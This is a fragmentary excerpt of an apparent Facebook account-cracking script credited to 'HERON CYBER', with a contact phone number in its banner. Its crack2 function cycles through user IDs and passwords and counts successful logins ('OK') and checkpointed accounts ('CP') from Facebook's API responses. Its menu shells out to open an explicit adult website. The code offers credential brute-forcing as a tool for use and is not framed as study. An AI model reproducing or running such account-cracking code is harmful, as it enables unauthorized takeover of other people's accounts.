...
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Author       \x1b[92;1m=>      \x1b[93;1mHERON CYBER 
\x1b[93;1m Whatsapp     \x1b[92;1m=>      \x1b[93;1m+8801722183463
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
...
def menu(): #Bilo
	...
	if farhan in ['1','01']:
		...
		os.system("xdg-open https://www.sexindrag.com/video/download-xxx-vedio/")
		exit()
	else:
		os.system("https://www.sexindrag.com/video/download-xxx-vedio/")
		exit()
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s [HERON] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [HERON-CP] %s|%s        '%(b,idf,pw))
